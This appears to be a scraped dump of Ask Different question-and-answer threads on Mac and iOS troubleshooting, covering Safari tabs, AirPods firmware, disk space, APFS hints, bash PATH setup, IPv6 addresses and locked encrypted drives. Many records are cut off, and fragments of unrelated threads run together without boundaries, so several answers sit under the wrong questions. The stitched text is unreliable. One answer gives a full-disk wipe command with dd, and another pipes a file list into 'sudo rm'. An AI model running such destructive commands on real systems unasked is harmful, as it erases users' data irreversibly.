great starter if the Guide app that ships with iOS 13 doesn’t help you enough:\n\n\n*\n\n*https://support.apple.com/en-us/HT210400\n\nA: On your iPad go to Settings.

Anyone else or any suggestions? I keep tabs open till I’ve dealt with them. This behaviour is a blow for me.\n\nA: While it’s not enabled by default, iPadOS has an option for Safari to automatically close open tabs if they’ve not been viewed for a while. Have you accidentally enabled that option and set it for one day? You’ll find it under Settings / Safari / Close Tabs. \n\nA: I did some more checking - at the time of the upgrade I also set up Safari iCloud tabs for the first time. For some reason - maybe because my iMac is so old, I think the tabs disappeared. \nAnyhow, I turned off iCloud Safari on the iPad (data from other devices was not showing anyway) then tried. Tabs remain, even after shutdown. I re-enabled iCloud Safari. It kept working OK. But still no data from the other device (iPhone 6)\n", "Q: AirPods 2nd Gen. with firmware 2A364 dropped volume level in non-iOS Devices When I bought new Airpods 2nd gen, the firmware it came with was 1A673. The volume level on my android phone (OnePlus 6T) when connected was quite loud and everything was good.\nBut when I connected my Airpods to my iPad with iOS 13.1 the firmware on these got updated to 2A364 and then when connected to my android phone, music volume started getting low. I tried with other android phones too.\nBut the thing is during the phone calls the volume comes out loud but low only on music or videos.\nHow do I fix this?\n\n\nA: I have the same issue and considering its an apple device, there isn't really any way to downgrade them. You're probably going to have to wait until apple fixes the bug.\n\nA: Since there’s no documented way to roll back firmware on these, you would presumably contact Apple and/or wait for a patch to put the volume back if this change was not intentional by Apple.\n", "Q: Always show full URL in Safari address bar From the screenshot: notice we only see \"github.com\":\n\n\n\nYes it is possible to see full path by actually selecting the URL:\n\n\n\nBut I would like to see the full URL always - without that extra step.

I've seen some suggestions about not allowing free disk space to go critically low or\n\n... to have no less than about 15% of your drive's capacity free ...\n\nCurrently, I've been silencing the \"disk full\" notification for  a day now, but haven't observed any performance degradation. \n\"The risks involved with low disk space\" is the theme of the question. More specific questions are:\n\n\n*\n\n*What processes will see a problem in low storage space (except spotlight, assuming I don't use it.)? \n\n*Is there an official backing for the claim? \nMacBook Air 2017, Mojave. \n\nA: There are a number of issues you could have with low disk space, but I wouldn't consider them high-risk. On a SuperUser post, the accepted answer cites a lot of information that is very old. The 10%-15% free space adage may even be out of date with APFS and modern SSDs. There is an older post on AskDifferent regarding the 10% free space limit with answer mentioning certain system process impacted by low disk space.\nTypically, these are the main factors I've heard mentioned concerning having not enough free space:\n\n\n*\n\n*macOS uses virtual memory. When more space is needed in RAM, macOS will swap some data from RAM to the hard disk. This is explained in an older Apple developer guide. If RAM is full and the disk is full, applications can crash.\n\n*Data that normally stays in purgeable storage, like caches and local Time Machine backups, will be unavailable for use. If you use the Store in iCloud feature, you could see many files unavailable locally that you would have to download again.\n\n\nAnecdotally, I've run into these issues:\n\n\n*\n\n*Large projects in Photoshop or Premiere couldn't be saved because there's not enough free space. This is risky since a crash could lead to losing data, even if I'm diligent at saving.\n\n*System updates unable to be installed due to lack of space.\n\n\nA: I think the main risk is that you inadvertently completely fill your disk drive. There have been several questions on this site from people who filled their disk drives and then ran into problems trying to delete files. You can search on Ask Different for something like \"disk drive full\" and you'll see several questions about problems encountered with a full drive. Two previous questions are here and here.\nI'd be very aware of free disk space and not fill your drive. It may cause problems.\n", "Q: Show menu bar on multiple screens without separate spaces I have two screens. I want:\n\n\n*\n\n*Windows to be able to span multiple screens\n\n*A menu bar on both screens\n\n\nIs that too much to ask? There is an option that affects both of these: \"Displays have separate Spaces\". With it on you get two menu bars but windows cannot span multiple screens. With it off you they can but you only get one menu bar. Is there a solution to this madness?\n\nA: In short, no.\nThe menu either belongs to your primary screen, or if you have 'Displays have separate Spaces' on, then to the one currently active.\nIf you have different Spaces on different screens, there is no logic to control any window being able to span the two. What would happen if you changed Space on only one of them?\nThere is no third option, as far as I'm aware, even with 3rd party software.\n", "Q: Command line \"open DIRNAME\" fails (but \"open FILENAME\" is OK) In a terminal (or xterm, or emacs) window, the command:\n  open dirname\n(where dirname is . or /tmp or /home/fred) doesn't open the the specified directory in Finder.

Unfortunately, at a new job, I can only used wired mice, NOT wireless (security issues). \nIs there anything equivalent to the Magic Mouse, but uses a USB cable (for Emission Security)??  I'd really like something with a touchpad feel (NO scroll wheel!) in a mouse, that works for Mac and Windoze 10.\n\nA: I would recommend using a wireless USB mouse (uses 500 Hz or so) and comes with a little mini USB that you can use to plug-in to the PC. Logitech has a couple like this, you may have to look around for some.\nBut if you are looking for one for a Magic Mouse, you won't find one.\nIf you are concerned about accessing all of the Magic Mouse features with a wired/wireless (USB) mouse then I recommend finding one that uses gestures or has multiple buttons (like a gaming mouse).\n", "Q: Do I need to run out and purchase a new MacBook Pro to upgrade to Xcode 11?

In my personal experience, I was unable to run it on macOS Mojave 10.14.4 and was asked to update to 10.14.6.\nComing to the Mac requirement, any Mac capable of running macOS Mojave 10.14.6 can run Xcode 11. Subsequent releases of Xcode will eventually drop macOS Mojave and you'll need a Mac capable of running macOS Catalina 10.15.\nIt would be good to make sure that your Mac is capable of running macOS Catalina. Here's a list of devices capable of running macOS Catalina (source):\n\nAnswering your specific questions:\n\nSo I will need Xcode 11 by April of 2020, will High Sierra 10.13.6 support it?\n\nNo. macOS High Sierra 10.13.x doesn't support running Xcode 11.\n\nIf I download Mojave, will it support Xcode 11?\n\nmacOS Mojave 10.14.4 through 10.14.6 support Xcode 11.0 through Xcode 11.3.1. You may be prompted to update to a recent version of macOS Mojave (up from 10.14.4) for some versions of Xcode in the said range.\n\nIf I download Mojave, with only 11GB left on my hard drive, will that be a problem?\n\nYou may likely run out of space while attempting to install Xcode.

Here is the result of diskutil list with the two drives connected, one that shows a hint and is decrypted, the other that does not show a hint and is locked:\n\n$ diskutil list\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *121.3 GB   disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                 Apple_APFS Container disk1         121.1 GB   disk0s2\n\n/dev/disk1 (synthesized):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      APFS Container Scheme -                      +121.1 GB   disk1\n                                 Physical Store disk0s2\n   1:                APFS Volume Macintosh HD            105.0 GB   disk1s1\n   2:                APFS Volume Preboot                 45.5 MB    disk1s2\n   3:                APFS Volume Recovery                510.4 MB   disk1s3\n   4:                APFS Volume VM                      2.1 GB     disk1s4\n\n/dev/disk2 (external, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *240.1 GB   disk2\n   1:                        EFI EFI                     209.7 MB   disk2s1\n   2:          Apple_CoreStorage Time Machine Encryped   239.7 GB   disk2s2\n   3:                 Apple_Boot Boot OS X               134.2 MB   disk2s3\n\nOffline\n                                 Logical Volume Time Machine Encryped on disk2s2\n                                 2930C7CC-4EE4-43AB-B1FB-81756A1CC0E5\n                                 Locked Encrypted\n\n\nA: The password hints are not stored on the local computer as such. \nInstead for APFS it is stored on the encrypted drive itself in the \"volume passphrase hint\" key bag. You can read the specifics here APFS File  System Reference.\nFor HFS+ it is stored in the \"PassphraseHint\" entry of the \"CryptoUsers\" structure in the \"com.apple.corestorage.lvf.encryption.context\" structure in the CoreStorage XML plist on the encrypted drive. You can read the specifics here FileVault Drive Encryption\nNote that password hints are only stored for passphrase (i.e. password) protected drives.\nTherefore I cannot confirm your assumption. This is always the case.\nNote: In the answer from lx07 I see that he concludes that the hint is not stored on the drive after looking for it with a hexeditor. That is not correct. The PLIST is compressed using DEFLATE and the hint itself might be base64 encoded. You'll need to decompress the data before searching for the hint, if you want to find it manually that way.\nIn addition take note of section 7 of the reference FVDE document (The encryption context plist) - namely that depending on your setup the PLIST containing hint could be located outside the encrypted partition, and instead be stored on the \"Recovery HD\" partition on the same physical drive. It can be stored either in unencrypted or encrypted form. In case of encrypted form, the AES-XTS key is the volume identifier of the encrypted volume (i.e. the key is stored non-encrypted on the drive).\n\nA: For APFS volumes the hint is stored on the volume.  See Apple File System Reference.pdf \nPage 120\n\nThe volumeʼs keybag might contain a passphrase hint for the user (KB_TAG_VOLUME_PASSPHRASE_HINT), which you can display when prompting for the password.\n\nPage 131\n\nKB_TAG_VOLUME_PASSPHRASE_HINT\n  The key data stores a userʼs password hint as plain text.\n\nThis will show a hint when you try to open it.\n\nEncrypted HFS (macOS Extended) however doesn't have the Show Hint/Hide Hint button :\n\nUnlike for APFS I could not find detailed documentation for the layout of CoreStorage volumes but looking with hex editor of an encrypted HFS volume  the hint is not stored in plaintext.  EDIT: See the answer by jksoegaard for how it is stored and link to FireVault Drive Encryption documentation.\nThis was tested on Mojave version 10.14.6 - whether the Show Hint button was shown on earlier versions I do not remember.\nThis issue of encrypted HFS+ volumes not showing hint is discussed more in this unresolved question - How do I get the password hint for an encrypted disk?\n", "Q: Backup a Time Machine .sparsebundle to Amazon Glacier I want to make an off-site backup of my Time Machine, and Amazon Glacier seems to be a cheap and reliable place to put large files in.\nAnyone has experience using Glacier in such settings? Any tips on how to upload the files there?\n\nA: The \"s3cmd\" tool seems to be quite popular for copying files to Amazon Glacier, either manually or via scripts:\nhttps://s3tools.org/s3cmd\nYou could also use commercial tools such as CloudBerry Backup to automatize synchronizing the Time Machine sparsebundle with Amazon Glacier.\n", "Q: Streaming Netflix offline on Macbook using Windows I've decided to install Windows 10 on my MacBook Air (256GB, 2019 Model) using bootcamp in order to stream Netflix offline using their app. I'll be downloading movies using their app, to watch them offline later.\nI want to ask :\n\n\n*\n\n*How much memory would be ideal to allocate to Windows for above usage?\n\n*Will I lose on video/audio quality? If yes, then how much? Will it be too terrible to drop this idea altogether?\n\n\nA: I think by memory you mean disk space - that really depends on how many movies and other files you want to store at a time.\nThere should be no difference in video/audio quality. The only exception is if you're running something else that is so taxing on the computer that it is not able to play the video in real time. If that happens, close down the other programs while watching video. This is no different than when streaming Netflix on a PC.\n", "Q: Is it possible to enable underline keyboard shortcuts and access keys? There is a very convenient feature in Windows that underlines keyboard shortcuts such as in the image below. If I want to select Action, I can just press Alt+a; Refresh Alt+f; and so forth. The underlines appear in Microsoft apps, installers so I can just press alt+n for next instead of using my cursor, etc. It is really wonderful and I miss it. Is it possible to get something like that in OSX because I hate using my mouse. \n\n\nA: macOS does have keyboard shortcuts, but they do not display with underlined letters. Many menu items will display their shortcut to the right. Some menu items will not have a shortcut.\n\nIf the menu item doesn't have a shortcut, you can press Command + Shift + / to open a search bar that will let you type in the command. You can arrow down and hit return to activate that menubar item.\n\nYou can also arrow through the menu bar by pressing Control + F2 (or Control + Fn + F2). You may need to toggle this on with Control + F1.\n", "Q: How to resolve iPhone 7 running iOS 13.1.2 not supported by Xcode 10.1?

These are not cached pages, either.\nAny thoughts on this?\niMac (Retina 5K, 27-inch, 2019)\nmacOS Mojave 10.14.6 (18G95)\n\nA: There is no specific solution or answer for such a thing. First, Chrome is a memory hungry application. However, here are the basic reasons. For others, we have to know the details. \n\n\n*\n\n*Reason 1: Your Cache is Beyond Overworked\n\n*Reason 2: Chrome is Outdated\n\n*Reason 3: Flash is Always Enabled\n\n*Reason 4: Overzealous Plugins/Extensions\nClear the cache, revmoe extensions and disable flash if needed. \nBut as I mentioned earlier, these are the primary workaround.

That warning usually comes up due to the programmers behind the page making a mistake, such as a memory leak, which makes the page use an ever increasing amount of memory. It might of course also be a page with an application that simply requires a lot of memory - that’s not usually the case on Stack Overflow though.\nAnother reason for the warning could be that you have a browser plugin or other software installed (such as antivirus programs) that manipulate the page to insert code, and they then have a bug that results in high memory use. In some countries it could also be an ISP inserting code into pages - but that would usually require you accepting/installing certificates on your computer in advance.\nFinally it might of course be related to something with security. However there’s nothing that indicates that here. Usually programs that try to exploit your computer wouldn’t use huge amounts of memory to avoid rousing suspicion. The only way to tell would be to examine the actual page source of the page you’re currently viewing.\n", "Q: Sync Imessage Group Chat History between devices I accidentally deleted the history of an imessage groupchat from my iphone but it still appears on my mac.

How do I use those .ichat files to restore the chat in my iPhone? \n\nA: I have a solution that I did a long time ago which you can try at your own risk. First make a backup of the following folder, maybe in a removable device to be on the safe side. \nWhat you need: \n\n\n*\n\n*Backup the following files from your user folder. Don't delete any folder beside instructed one. Library is hidden so press cmd+shift+. to make them visible. Use same button to revert it back\n~/Library/Containers/com.apple.iChat\n~/Library/Message\n~/Library/Preferences -> Find all the files that contain the string \"iChat\" or \n\"iMessage\"\nNote: Kindly do this without being on the Internet from the start else iCloud from iPhone can sync with your MacBook later and you might get an issue. \nNow as a crucial step: \n\n\n*\n\n*Rename\n\n\n~/Library/Containers/com.apple.iChat  -> ~/Library/Containers/com.apple.iChat_old\n~/Library/Message -> ~/Library/Message_old\nBut, Find all the files in ~/Library/Preferences that contain the string \"iChat\" or \"iMessage\" and CUT them into a separate folder or external HDD. Be sure to remember where you copied them from! Don't rename this folder or files under it. \nAfter this, copy all the original folder that you have backed up \nFor example:\ncom.apple.iChat -> to the original place under ~/Library/Containers so here you will have two file com.apple.iChat_old and com.apple.iChat\nThe same goes for the message folder. However, you have cut, so paste back the file that contains iChat and iMessage back to the Preferences. \nDO NOT START THE MESSAGES APP and restart your computer\nOpen Messages, your old chats should all be there. And sync with your iCloud from Mac and it should come to your iPhone also. \n", "Q: Is there a command to remove previously installed package? I have installed a .pkg package with the installer command. But there are problem with that installation. Now I want to remove it.

Nevertheless — and needless to say — extreme care should always be taken when removing files with root privileges. \n$ pkgutil --only-dirs --files the-package-name.pkg | tr '\\n' '\\0' | xargs -o -n 1 -0 sudo rm -ir\n\nOnce you’ve uninstalled the files, you can remove the receipt with:\n$ sudo pkgutil --forget the-package-name.pkg\n\nFor more details, see the pkgutil main page.\n", "Q: Is my new Time Machine backup okay if my MacBook went to sleep during encryption? I started a new Time Machine backup last night and enabled the third-party app Amphetamine to keep my machine awake for 9 hours. When I returned in the morning, it appeared that my MacBook went to sleep after those 9 hours, but Time Machine still read \"Encrypting...\".\nIs my Time Machine okay, or do I need to wipe it and start again?\nAfter this, I ejected the Time Machine drive and plugged the it back into my Macbook when I got to work. It backed up a new 500 MB of files and went back to encrypting.

A while back my Macbook Pro battery started acting up. Now I pretty much have to have it plugged in all the time otherwise it'll turn off. Also, I am getting (replace soon) battery status. I'll change the battery ASAP.\nBut, I've just noticed that my electricity bill may went up so much because of this. So, Is there a way I can estimate the amount of power I've consumed last 30 days? or is there anyway I can check and estimate?\nThanks\n\nA: I think it's unlikely that your total electricity bill went up significantly because of this. A battery is just an \"energy container\": the energy it contains came from your wall socket. \nIf the battery won't hold charge, then the Mac is just using the electricity it needs to run. \nIf the battery will hold charge, then the Mac is using the electricity it needs to run PLUS refilling the battery. You can of course use the Mac on battery, but then you're recouping the extra you used to fill it.\nLet's say your Mac needs 10W to run, and 20W to fill the battery over 2.5 hours. You normally use it for 5 hours a day. With 'no' battery: you use 10W to run it, for 5 hours: 50Wh per day.  \nWith a working battery, you charge up the laptop (while it's off) at 20W for 2.5 hours (50Wh), and then use that charge over 5 hours or so.\nOr, you could use it on power for 5 hours, while charging the battery: 30W (running and charging) for 2.5 hours plus 10W (running) for 2.5 hours. That's 100Wh, but now you've got a full battery, which will see you through tomorrow.\nTL;DR: Assuming you're spending the same time on your Mac, your energy usage should not change much. But it's worth getting the battery replaced anyway.\n", "Q: Can't add Google account to iOS 13. Default browser not supporting cookies?

For example in TexShop the white background is automatically changed to a grey-value. For me it's probably fine if I'd able to change the white background to grey, but maybe its possible to even change it to another color like the nightmode on iOs?\nIs this possible with Preview out-of-the-box?

You can create your own with libheif and exiv2 in Terminal:\n\n*\n\n*You need a XMP metadata blob, save this as light_mode.xmp:\n\n<?xpacket?>\n<x:xmpmeta xmlns:x=\"adobe:ns:meta\">\n<rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns\">\n<rdf:Description xmlns:apple_desktop=\"http://ns.apple.com/namespace/1.0\"\napple_desktop:apr=\n\"YnBsaXN0MDDSAQMCBFFsEAFRZBAACA0TEQ/REMOVE/8BAQAAAAAAAAAFAAAAAAAAAAAAAAAAAAAAFQ==\"/>\n</rdf:RDF>\n</x:xmpmeta>\n\n\n\n*Insert the XMP metadata: exiv2 -i X in light_mode.png (assumes light_mode.xmp exists)\n\n*Combine two images into one: heif-enc -L light_mode.png dark_mode.png -o dynamic.heic\nI wrote up a blog post about the details here.\n\nA: I have a good feeling that the Dark/Light themed wallpapers work similarly to how Dark/Light themed images work with WebKit.\nAs of macOS Mojave, website developers can make their webpages change based on the system theme (light or dark). Websites that support dark mode will have at least 2 images, a dark-themed image and a light-themed image. When a user changes their theme from light to dark (or vise versa), the webpage will transition from one image to the other accordingly. \n\nFor their light/dark wallpapers, Apple may have created two similar images and given them the exclusive ability to transition when the Dark Mode setting changes; but I cannot be 100% certain. If this is the case, they probably just use a standard image file format but made it so only they can make transitioning wallpapers.\n", "Q: Are there modifications I can make on a Mac Pro 2012 so it can run macOS Catalina?

This has been fine, since I mostly listened in the car. Since I retired recently, I am driving less and would like to put the CDs into iTunes (mostly for my iPads and iPhones). I have already put a small percentage of the CDs into iTunes. Now, I am considering putting the remainder (~200) into iTunes. \nBut, now that there are rumors that iTunes will be discontinued, is this a dead-end?  Most of the existing files are \".m4a\" files. Any recommendations?\n\nA: \nnow that there are rumors that iTunes will be discontinued, is this a dead-end?\n\nNo, it's not a dead-end. There will ALWAYS be a way to play your own music files ripped from CD.\nIf not in an app called \"iTunes\", then in Apple Music, or a 3rd party application such as Winamp.\nContinue ripping your CDs and collecting (and backing up!) the .mp3 or .m4a files. You will be able to play them.\n\nA: You'll still be able to play your music, even if you have to use other programs. For instance, the free and popular VLC multimedia player plays music in several formats, including mp3 and m4a.\n\nA: It is not a rumor - it has been officially announced by Apple that iTunes is going away. It is going to be replaced by Apple Music, Apple TV and Apple Podcasts in the next release of macOS named Catalina.\nIn practice you'll just start using the Apple Music program for listening to your old ripped CDs instead of using iTunes - so this is definitely not a dead-end. Your iTunes Library will be carried over automatically.\nCatalina Features\n", "Q: Will Catalina users be able to stubbornly cling to iTunes? iTunes won't be bundled with Catalina.  A user of the beta has identified some serious deficiencies in the replacement.  I don’t argue with the consensus that iTunes is a mess, but some of the disappearing features are valuable.\nThe “announcement” (aka “marketing”) says that iTunes 12.8 can be used with “OS X version 10.10.5 or later” which technically implies it will continue to be usable.  But I’m skeptical.\n\nA: The page you've linked specially states that 12.8 is available for \"previous versions of macOS\". I think it is clear that iTunes on Catalina is not an intended configuration, nor is it probably officially supported by Apple.\nIndeed if you try to install iTunes 12 on the Catalina GM, you'll be informed that it is incompatible software - and won't install.\nIf you really, really want to run iTunes on Catalina, you can use this script to allow installation.\n", "Q: How can I retrieve a deleted iMessage if using iMessage in iCloud? I realize too late that I deleted a very important iMessage conversation and I need to retrieve it. \n\n\n*\n\n*I have iMessage in iCloud. \n\n\nTo attempt a restore, of course I had to reset my phone and did a restore from a back up and the message did not appear. I have chatted with Apple gone to the Apple store and had numerous conversations with techs but I get a different answer each time I speak to a new rep. \nWhat options might I have at this point?\n\nA: There is no web interface to view or undelete or recover data for messages. Some data sources do have this at https://www.icloud.com/settings/ so you might check that periodically in case it gets added in the future.\nAny device backup to iCloud or to a computer (iTunes / macOS / Apple Configurator) would be your best bet if you don't want to pay a forensic data recovery specialist or general data recovery company to try and recover artifacts from the storage on iOS.\n", "Q: autoconf temporary ipv6 address My mac machine has been assigned two public ipv6 addresses with same prefix. One is autoconf temporary and the other is autoconf secured. I know about secured one but what is the purpose of autoconf temporary address?\nThanks\n\nA: Short answer: because the \"secured\" address is not secure enough (or, more accurately, doesn't protect your privacy well enough). Specifically, it's still a long-term identifier for your computer until/unless you move it to a different network.\nLong answer: When a host is configured via SLAAC, that provides a 64-bit prefix for the host's public IPv6 address(es); the host then has three main ways to choose suffix(es) to use in its public address(es):\n\n*\n\n*It can derive its suffix from the interface's hardware (MAC) address using the modified EUI-64 format. Problem: any host you communicate with can trivially figure out your hardware address, which gives some info about your computer's manufacturer and maybe type. It also allows them to uniquely identify your computer not only over time but also as it moves around the Internet, since when you move to a different net the prefix will change, but your suffix will stay the same.\n\n\n*It can use a cryptographically generated (\"secured\") suffix. This does not leak information about your hardware, and will be different for each different network you use (removing your trackability between locations/networks), but still allows your computer to be uniquely identified within each of the networks it uses.\n\n\n*It can use a sequence of temporary addresses. Like secure addresses, these hide your hardware information and avoid trackability between locations, and also limits your identifiability while you're on a particular network.\nFor example, if a website gets hit from several different addresses from the same network on Monday, and then again on Tuesday, it can't tell (at least by the addresses) if it's the same or different computers on Monday vs. Tuesday, and if it's the same ones it can't tell which of Monday's client IPs corresponds to which of Tuesday's client IPs.\nNote: I've listed these address types by security (/privacy) level, not chronologically. Apple started using temporary addresses in v10.7 (Mac OS X Lion), and cryptographically generated addresses replaced modified-EUI-64 in v10.12 (macOS Sierra).\nCurrently, macOS uses both cryptographically generated and temporary addresses, but prefers the temporary address for outgoing connections.\n", "Q: How to add the PATH for mysql bin on Mac? I want to add the PATH for mysql.exe on my Mac. I tried this via terminal, but \n$ vi.bash_profile\nvi.bash_profile command not found.\n\ndoes not work. I tried this for generating the bash_profile to add the PATH.\nWe want to enter the code\nexport PATH=PATH:/Machintosh HD/Application/mampstack-7.3.8-0/mysql/bin\n\nafter the generating bash_profile.\n\nA: You need a space after vi and before the . so vi .bash_profile not vi.bash_profile.\nIf you are not in your home folder you can also use vi  ~/.bash_profile to specify the location as mentioned in ankiis answer below/above.  Again you need a space after the vi.\nAlternatively, instead of using vi you can add your path to .bash_profileusing echo 'export PATH=/my/path:$PATH' >> ~/.bash_profile as explained in this answer.\n\nA: Bash profile can be reached at ~/.bash_profile. I don't use vim, but nano ~/.bash_profile works. Hope vim is similar too.\n\nA: Some users who are new to the Mac will find it easier to edit their bash_profile file directly in their favourite text editor rather than via Terminal.  Yes, it's slower, but can be easier for newbies to understand what's going on and diagnose errors.  Here are the steps.\n\n\n*\n\n*Open Finder and from the menu at the top select Go → Home.\n\n*Sort the files in your Home directory by name alphabetically, then look for a file called \".bash_profile\".  The file will be greyed out.  (If you can't see any greyed-out files, toggle showing hidden files with shift-cmd-.)\n\n*Duplicate the file to make a backup.  (I suggest renaming the duplicate with today's date - e.g. \".bash_profile_BAK_20191005\".)\n\n*Open the .bash_profile file with your favourite text editor - e.g. Sublime Text.\n\n*Read through the file!  (I learned most about how the .bash_profile works by Googling every line and then editing it with ideas suggested by other Stack Exchange users.)\n\n*Add the new line you need (making sure - using Finder or Terminal - that the path you are adding actually points to the right files on your own Mac, which may of course be different to other users).\n\n*Save the file.\n\n*Reload the new bash profile by going into Terminal and running the following line:\nsource ~/.bash_profile\nRe point 2 above, I installed MySQL via Homebrew, and the paths were different to yours (and are different again on my other Macs).  E.g. my current paths to MySQL are:\nexport PATH=/usr/local/Cellar/mysql/8.0.12:$PATH\nexport PATH=/usr/local/Cellar/mysql/5.7.22/bin/mysqld:$PATH\n\nUltimately the two options - edited in Vim in Terminal or in a text editor - end up at the same destination.  The only thing that matters is which approach you personally find easier. \n", "Q: 1 pixel gap between window top and menu bar MacOS Mojave 10.14.6 MacBook Pro (13-inch, 2017, Two Thunderbolt 3 ports)\nI have a 1 pixel gap between the top of the window and menu bar and I can't move the window close to the menu bar.\n\nIs there any way to solve this problem?\n\nA: This appears to be the design of the Safari window.  Safari (and other Apple apps) have a grey shadow border in dark theme and black in light theme :\n\n\nIt seems the color of the border is unaffected by the background - here is dark mode with colorful wallpaper and the border is still grey.\n\nWhereas Firefox keeps a black border for both themes and so it doesn't show in dark mode.\n\n\n\nLooking at other apps there seems to be a mix.  Word acts like Safari while ITerm2 acts like Firefox.  \nThere doesn't seem to be any way to remove this in Mojave - see this question.  Older fixes/tweaks (like Toggle OSX shadows) don't work any more.\n\nA: Yes - I solve this by coloring the top part of my desktop to match the shadow color.\nThat way, we don’t need to mind the gap.\n", "Q: Why does App Store start updating Xcode when latest version already installed?

I'm an owner of a macbook pro retina 15' late 2013 that I bought (in used conditions) from the web 2 months ago.\nJust few days ago, while having 2 external display and a thunderbold blackmagic ministudio recorder connected, the battery dropped to 0% despite the ac adapter was plugged in.\nIn addiction to this, sometimes the mac ran very slow (for example while hovering the icons on the dock, the magnifier effect looked jerky) and the kernel_task process took over 200% of cpu usage.\nAfter that I found out the ac charger was 65W instead of being 85W (that was supposed to be included in the box... so it means I was mislead in first place from by seller). When I replaced it with the correct power adapter I solved all my problems.\nBut the doubt remains..\nDoes it make sense that the slow performance and the kernel_task process locking the cpu was caused by the wrong ac adapter only? Can someone confirm that I ultimately solved my problems using a more powerful power adapter? Someone who maybe encountered the same exact scenario and had the same issues. I ask because I'm afraid the cause was more subtle and I have still no idea if it could arise again also now I set up a more appropriate configuration.\n\nA: I would suggest that your analysis sounds completely reasonable.  \nI have a 2013 MBP without a battery and it runs at 1.2GHz instead of 2.4GHz unless I override the BDPROCHOT setting that is set in the case of missing battery.  CPU throttling to half speed is well known if battery is dead or missing.  See here,here and here as random examples. \nLets assume your PC has a I7-4850HQ this has a maximum TDP of 47W.  Add to this the demands of rest of the PC, your extra peripherals and you are easily using more than 65W so you drained the battery to zero (as you said) and this CPU limiting kicked in.  \nI'd suggest to prove it you download Intel Power Gadget and it will tell you the amount of power your CPU is using under whatever workload to which you can add your other peripherals.  Here you can see my CPU is using ~40W on a similar 2015 mbp to yours with the jump in power usage just being due to rapidly scrolling up and down in Firefox for the sake of this picture.\n\nYou can use various software cap the amount of power your CPU will use but that is another question.\n", "Q: Mac mini won't start in any mode.

But, I saw that in single user mode, I can list directories and files. So, the disk looks to be working.\nWhat makes it even more bizarre, is that when plugged this disk as a external disk on another mac computer it restarts immediately and shows the black screen of death.

Fsck stands for File System Check (the name is sometimes referred to as File System Consistency ChecK); it can be used with various optional parameters.\nIt will take a few minutes. \nIn the end, if your drive was OK, the screen will say “The volume (name of your hard drive) appears to be OK”. If any repair was made, you’ll see the prompt, “FILE SYSTEM WAS MODIFIED”. Then, you’ll see the root# prompt again.\nRight after the root# prompt, enter the following:\nreboot\n\nPress the Return key. Your Mac should restart normally.

I have an SSD, which until this morning I booted from through an usb3-to-sata adapter. I shut the computer off, removed the drive and came back to the Macbook hanging on a black screen when trying to boot from it.\nI have tried with both MacBook Pro 15-inch 2018 and a Mid-2012 13\" model. They behave similarly in that nothing happens after pressing ALT during boot and selecting the volume. Both Macbooks have macOS Mojave on them.\nThings I've tried\n1\nBooting a different volume and trying to mount the offending disk (e.g. via disk utility), this window appears:\n\nBut it does not allow me to actually enter a password.\n2\nI have also tried the following form the terminal:\ndiskutil apfs unlockVolume /dev/disk3s1\n\nThis prompts for the password, but fails with \nPassphrase incorrect or user does not exist\n\nalthough the passphrase is correct.\n3\nI then ran diskutil apfs listcryptousers /dev/disk3s1 and got this list:\nCryptographic user for disk3s1 (1 found)\n|\n+-- EBC6C064-0000-11AA-AA11-00306543ECAC\n    Type: Personal Recovery User\n\nNot sure what this means, but I used the UUID to unlock the volume, to no avail:\n$> diskutil apfs unlockVolume /dev/disk3s1 -user EBC6C064-0000-11AA-AA11-00306543ECA\nPassphrase:\nUnlocking the specific cryptographic user EBC6C064-0000-11AA-AA11-00306543ECA on APFS Volume disk3s1\nError unlocking APFS Volume: Malformed UUID (-69578)\n\n\nAt this point, I guess I have to erase the drive and restore it from backup, but macos recovery does not allow me to erase it without unlocking it. Seems to me I'm trapped by buggy software.\nWhat can I do here? (even if it involves erasing the disk in question)?\n\nA: Regarding the first attempt to simply use unlockVolume, please consider trying this variation instead:\ndiskutil apfs unlockVolume /dev/disk3s1 -user disk\n\nYour attempt to unlock using the UUID failed, because you failed to enter the complete UUID. I don't know if you typed it in manually or used cut-n-paste, but you've missed the last letter \"C\" in the UUID - making it one character short. \nI would try that command again with the full UUID - and remember that you're not supposed to enter your passphrase for the drive to unlock it with that UUID - instead you need to enter the personal recovery key. The personal recovery key was presented to you when you first enabled FileVault (I assume this drive was previously a boot drive) - and it takes the form of 24 upper cases alpha-numeric characters, grouped in 4 seperated by dashes. Something like AB1C-DEF2-G3HI-4JKL-MNO5-PQRS.\nIf the above fails, you can always erase everything on the drive completely, as you indicate this would be an acceptable option.\nYou can do that by opening Terminal.app and running the following command:\ndd if=/dev/zero of=/dev/rdisk3 bs=1m\n\nAfter it has finished, reboot the system so that it forgets the old partitioning information. Then you can use Disk Utility to add a partition table and format the drive.\n\nA: Well I’m not expecting it as an answer but it’s a wild thing to try.\nI encountered something similar when I forced shutdown my Mac when OS was probably doing something “important”. My guess is that the system recovery unmounted the volume to repair disk permissions and got interrupted. \nMy idea is to use some powerful disk partition utility (gpart) in Ubuntu and unmount the drive. Chances are you’d be able to recover the data just by repair disk permissions the next time you’d start with Mac.\nAt least you’d be able to format your hdd.\n", "Q: Can you upload photos directly to iCloud website from a PC (w/o iCloud for Windows SW)? iCloud website, Photos section doesn't have any options to upload photos. I was able to upload picture files to iCloud Drive so hopefully they show up in Photos app on iPhone? I was helping a friend move some stuff on a Windows PC at work & visiting the site via Firefox. I cannot load iCloud for Windows on my work PC.\nEDIT:\nIt was a new iPhone & friend didn't have it with him. I had downloaded photos+contacts from his old flip phone that I was trying to upload to iCloud website. See my answer below as I believe the new-ness of the phone/iCloud/Apple-account was the cause & I overlooked that.\n\nA: Log into iCloud.com, open the Photos web app, and you should see an Upload to iCloud icon in the upper right corner. \n\nA: After logging into another iCloud account & going to Photos I did have an upload button so clearly something unique with friends iCloud account. I believe it was because this was a new iCloud account & new iPhone with no pictures (I was trying to upload them on from old phone). I guess the iPhone Photos app had to be used before the website would be initialized/usable? The iCloud Photos simply had a background with no buttons (except switching to other iCloud apps) that I should have taken a picture of. Since my friend left I don't have access to his iCloud account anymore. However I believe my assumption was correct based on a Firefox cache file (https://www.icloud.com/applications/photos/1918Hotfix1/en-us/main.js) Line 11 & Column 54709:\n\n\"FirstRun.Title\":\"Welcome to 